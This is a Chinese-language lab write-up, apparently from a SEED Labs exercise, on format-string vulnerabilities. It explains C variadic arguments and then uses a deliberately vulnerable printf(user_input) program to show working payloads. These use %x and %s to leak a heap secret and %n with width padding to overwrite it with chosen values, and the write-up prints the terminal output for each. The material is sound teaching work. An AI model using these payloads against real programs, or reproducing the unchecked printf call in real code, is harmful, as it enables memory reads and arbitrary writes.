## Format-String Vulnerability

## 探索C语言的可变长参数
C语言标准库中头文件stdarg.h索引的接口包含了一组能够遍历变长参数列表的宏。
主要包含下面几个：
1. va_list 用来声明一个表示参数表中各个参数的变量
2. va_start 初始化一个指针来指向变长参数列表的头一个变量
3. va_arg每次调用时都会返回当前指针指向的变量，并将指针挪至下一个位置，va_arg根据第二个参数类型来判断偏移的距离
4. va_end需要在函数最后调用，来进行一些清理工作

观察my_print函数是如何实现可变长参数的?
```c
root@gt:/home/git/myRubbish/seedlab# ./a.out 
3.500000 
4.500000 5.500000 
root@gt:/home/git/myRubbish/seedlab# cat live5_func_arg.c 
#include <stdio.h>
#include <stdarg.h>
int myprint(int Narg,...)
{
	va_list ap;
	int i;
	va_start(ap,Narg);

	for(i = 0;i < Narg;i++)
	{
		//printf("%d ",va_arg(ap,int));
		printf("%f ",va_arg(ap,double));
	}
	printf("\n");
	va_end(ap);
}

int main()
{
	myprint(1,2,3.5);
	myprint(2,3,4.5,4,5.5);
	return 1;
}

```

printf库函数的底层实现是什么样的?
```c
int __printf(const char* format,...)
{
	va_list arg;
	int done;

	va_start(arg,format);
	done = vfprintf(stdout,format,arg);
	va_end(arg);

	return done;
}

```

printf缺失参数会发生什么?
```c
root@gt:/home/git/myRubbish/seedlab/live5# ./a.out 
ID:100 ,name:ailx10 ,age:-828258536 
root@gt:/home/git/myRubbish/seedlab/live5# cat arg_missmatch.c 
#include <stdio.h>
int main()
{
	int id = 100;
	int age = 25;
	char* name = "ailx10";
	
	printf("ID:%d ,name:%s ,age:%d \n",id,name);
	return 1;
}

```

## 格式化字符串漏洞程序

初始化实验环境:
关闭地址随机化:` `

认识常见的格式化字符:

格式符| 		含义 | 	含义（英）|传
---- | ------------- | ----- | -------
%d	 | 十进制数（int）  |decimal |  值
%u   | 无符号十进制数 (unsigned int)  | unsigned decimal | 值
%x   | 十六进制数 (unsigned int)  |hexadecimal |  值
%s   | 字符串 ((const) (unsigned) char *)  | string | 引用（指针）
%n   | %n符号以前输入的字符数量 (* int) |number of bytes written so far |  引用（指针）

任务:
1. 打印secret[1]的值
2. 修改secret[1]的值
3. 修改secret[1]的值为任意指定值

```c
/* vul_prog.c */
#include<stdio.h>
#include<stdlib.h>
#define SECRET1 0x44
#define SECRET2 0x55
int main(int argc, char *argv[])
{
char user_input[100];
int *secret;
int int_input;
int a, b, c, d; /* other variables, not used here.*/
/* The secret value is stored on the heap */
secret = (int *) malloc(2*sizeof(int));
/* getting the secret */
secret[0] = SECRET1; secret[1] = SECRET2;
printf("The variable secret’s address is 0x%8x (on stack)\n",
(unsigned int)&secret);
printf("The variable secret’s value is 0x%8x (on heap)\n",
(unsigned int)secret);
printf("secret[0]’s address is 0x%8x (on heap)\n",
(unsigned int)&secret[0]);
printf("secret[1]’s address is 0x%8x (on heap)\n",
(unsigned int)&secret[1]);
printf("Please enter a decimal integer\n");
scanf("%d", &int_input); /* getting an input from user */
printf("Please enter a string\n");
scanf("%s", user_input); /* getting a string from user */
/* Vulnerable place */
printf(user_input);
printf("\n");
/* Verify whether your attack is successful */
printf("The original secrets: 0x%x -- 0x%x\n", SECRET1, SECRET2);
printf("The new secrets: 0x%x -- 0x%x\n", secret[0], secret[1]);
return 0;
}
```

1. 编译运行获得如下结果:
```
[04/10/2018 22:39] seed@ubuntu:~/Seed$ ./a.out 
The variable secret’s address is 0xbffff2e8 (on stack)
The variable secret’s value is 0x 804b008 (on heap)
secret[0]’s address is 0x 804b008 (on heap)
secret[1]’s address is 0x 804b00c (on heap)
Please enter a decimal integer
1
Please enter a string
%d,%d,%d,%d,%d,%d,%d
-1073745172,0,-1208008724,-1073745004,1,134524936,623666213
The original secrets: 0x44 -- 0x55
The new secrets: 0x44 -- 0x55

```
由结果可以推断:
**printf 函数栈的第5个参数是int_input的值**

2. 我们修改int_input的值为secret[1]的地址会发生什么?
运行获得如下结果:
```
[04/10/2018 22:39] seed@ubuntu:~/Seed$ ./a.out 
The variable secret’s address is 0xbffff2e8 (on stack)
The variable secret’s value is 0x 804b008 (on heap)
secret[0]’s address is 0x 804b008 (on heap)
secret[1]’s address is 0x 804b00c (on heap)
Please enter a decimal integer
134524940
Please enter a string
%d,%d,%d,%d,%s
-1073745172,0,-1208008724,-1073745004,U
The original secrets: 0x44 -- 0x55
The new secrets: 0x44 -- 0x55

```
由结果可以推断:  
字符U的ascii码为0x55,  
完成任务1:打印secret[1]的值.  

3. 试一试%n ?
运行获得如下结果:
```
[04/10/2018 22:58] seed@ubuntu:~/Seed$ ./a.out 
The variable secret’s address is 0xbffff2e8 (on stack)
The variable secret’s value is 0x 804b008 (on heap)
secret[0]’s address is 0x 804b008 (on heap)
secret[1]’s address is 0x 804b00c (on heap)
Please enter a decimal integer
134524940
Please enter a string
%x,%x,%x,%x,%n
bffff2ec,0,b7ff3fec,bffff394,
The original secrets: 0x44 -- 0x55
The new secrets: 0x44 -- 0x1d

```
由结果可以推断:  
0x1d = 29,  
(8+1)*3+(1+1) = 27 + 2 = 29.  
修改secret[1]的值为29.完成任务2.  

4. 试一试控制输出宽度?
运行获得如下结果:
```
[04/10/2018 23:06] seed@ubuntu:~/Seed$ ./a.out 
The variable secret’s address is 0xbffff2e8 (on stack)
The variable secret’s value is 0x 804b008 (on heap)
secret[0]’s address is 0x 804b008 (on heap)
secret[1]’s address is 0x 804b00c (on heap)
Please enter a decimal integer
134524940
Please enter a string
%8x,%8x,%8x,%996u,%n
bffff2ec,       0,b7ff3fec,                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          3221222292,
The original secrets: 0x44 -- 0x55
The new secrets: 0x44 -- 0x400

```
由结果可以推断:  
0x400 = 1024,  
(8+1)*3 + 996 = 1024.  
修改secret[1]的值为指定的值1024.  

## 升级难度
如果第一个scanf语句不存在,如何实现上面的3个任务?

1. 试一试多打印几个`%08x` ?
```
[04/10/2018 23:48] seed@ubuntu:~/Seed$ ./a.out 
The variable secret’s address is 0xbffff2e8 (on stack)
The variable secret’s value is 0x 804b008 (on heap)
secret[0]’s address is 0x 804b008 (on heap)
secret[1]’s address is 0x 804b00c (on heap)
Please enter a string
%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,
bffff2ec,00000000,b7ff3fec,bffff394,00000000,0804b008,78383025,3830252c,30252c78,252c7838,
The original secrets: 0x44 -- 0x55
The new secrets: 0x44 -- 0x55

```
由上面的结果可知:
`0804b008`是secret的值,之后的`78383825`是`%08x`的ascii码.  
secret地址之后是我们的user_input的字符串的ascii码对应的十六进制.  
根据这一信息,我们可以将目标地址作为user_input的一部分放入栈空间中.  

2. 试一试将secret[0]修改成1024 ?
```
[04/11/2018 00:58] seed@ubuntu:~/Seed$ ./a.out 
,%08x,%08x,%08x,%08x,%983u,%n
The string length is 33
[04/11/2018 00:59] seed@ubuntu:~/Seed$ ./vulp < mystring 
The variable secret’s address is 0xbffff2e8 (on stack)
The variable secret’s value is 0x 804b008 (on heap)
secret[0]’s address is 0x 804b008 (on heap)
secret[1]’s address is 0x 804b00c (on heap)
Please enter a string
�,bffff2ec,00000000,b7ff3fec,bffff394,                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      0,
The original secrets: 0x44 -- 0x55
The new secrets: 0x400 -- 0x55
```



